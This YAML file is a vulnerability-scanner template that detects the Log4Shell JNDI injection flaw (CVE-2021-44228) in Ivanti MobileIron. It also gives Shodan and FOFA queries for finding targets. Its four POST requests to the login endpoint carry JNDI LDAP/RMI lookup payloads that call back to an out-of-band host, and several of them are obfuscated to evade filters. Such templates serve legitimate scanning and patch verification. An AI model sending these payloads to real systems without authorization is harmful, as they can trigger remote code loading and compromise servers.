id: mobileiron-log4j-jndi-rce

info:
  name: Ivanti MobileIron Log4J JNDI RCE
  author: meme-lord
  severity: critical
  verified: true
  description: |
    Ivanti MobileIron Apache Log4j2 <=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
    FOFA: MobileIron
    SHODAN: shodan-query: http.html:"MobileIron"
  remediation: Upgrade to version 2.14.2 or higher of MobileIron. If this is not possible, several Log4j exploit workarounds are available.
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
  tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev
  created: 2023/07/02

set:
  rooturl: request.url
  reverse: newReverse()
  reverseHost: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /mifs/j_spring_security_check
      headers:
        Referer: "{{rooturl}}/mifs/user/login.jsp"
      body: |
        j_username=${jndi:ldap://{{reverseHost}}}&j_password=password&logincontext=employee
    expression: reverse.wait(5)
  r1:
    request:
      method: POST
      path: /mifs/j_spring_security_check
      headers:
        Referer: "{{rooturl}}/mifs/user/login.jsp"
      body: |
        j_username=${jndi:ldap:${::-/}${::-/}{{reverseHost}}}&j_password=password&logincontext=employee
    expression: reverse.wait(5)
  r2:
    request:
      method: POST
      path: /mifs/j_spring_security_check
      headers:
        Referer: "{{rooturl}}/mifs/user/login.jsp"
      body: |
        j_username=${${X::-j}ndi:rmi:${::-/}${X::-/}{{reverseHost}}}&j_password=password&logincontext=employee
    expression: reverse.wait(5)
  r3:
    request:
      method: POST
      path: /mifs/j_spring_security_check
      headers:
        Referer: "{{rooturl}}/mifs/user/login.jsp"
      body: |
        j_username=${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{reverseHost}}}&j_password=password&logincontext=employee
    expression: reverse.wait(5)
expression: r0() || r1() || r2() || r3()